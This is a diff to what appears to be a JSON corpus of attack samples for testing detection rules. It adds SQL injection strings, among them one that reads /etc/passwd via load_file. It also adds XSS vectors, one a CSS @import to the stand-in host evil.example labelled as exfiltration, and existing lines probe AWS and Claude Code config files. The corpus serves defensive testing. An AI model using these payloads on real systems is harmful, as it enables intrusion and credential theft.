@@ -151,6 +151,17 @@
     {"id": "xss-104", "rule": "xss", "payload": "setInterval(code,1)", "note": "ejecución diferida de código"},
     {"id": "files-100", "rule": "sensitive_files", "payload": "?f=/sys/class", "note": "reconocimiento del sistema"},
     {"id": "files-101", "rule": "sensitive_files", "payload": "?f=/.claude/settings.json", "note": "configuración de Claude Code"},
-    {"id": "files-102", "rule": "sensitive_files", "payload": "?f=/.aws/config", "note": "configuración de AWS"}
+    {"id": "files-102", "rule": "sensitive_files", "payload": "?f=/.aws/config", "note": "configuración de AWS"},
+    {"id": "sqli-110", "rule": "sqli", "payload": "(SELECT password FROM users)", "note": "subconsulta entre paréntesis"},
+    {"id": "sqli-111", "rule": "sqli", "payload": "x' AND 7639=(SELECT id FROM t)", "note": "comparación contra subconsulta"},
+    {"id": "sqli-112", "rule": "sqli", "payload": "?f={\"a\":1}::jsonb", "note": "operador de cast JSONB de PostgreSQL"},
+    {"id": "sqli-113", "rule": "sqli", "payload": "'{\"b\":2}'::jsonb <@ '{\"a\":1}'", "note": "operador de contención JSONB"},
+    {"id": "sqli-114", "rule": "sqli", "payload": "?f=load_file('/etc/passwd')", "note": "lectura de fichero del servidor"},
+    {"id": "sqli-115", "rule": "sqli", "payload": "?f=sqlite_compileoption_used(1)", "note": "sondeo de la configuración del motor"},
+    {"id": "sqli-116", "rule": "sqli", "payload": "id'not like id--", "note": "negación pegada a la comilla"},
+    {"id": "sqli-117", "rule": "sqli", "payload": "id' is not id--", "note": "`is not` tras cierre de comilla"},
+    {"id": "sqli-118", "rule": "sqli", "payload": "?x=CHR(113)||CHR(122)", "note": "construcción de strings sin comillas (Oracle)"},
+    {"id": "xss-105", "rule": "xss", "payload": "<STYLE>@import'http://evil.example/x.css';</STYLE>", "note": "exfiltración por CSS"},
+    {"id": "xss-106", "rule": "xss", "payload": "?q=expression(alert(1))", "note": "expression() de CSS (IE)"}
   ]
 }
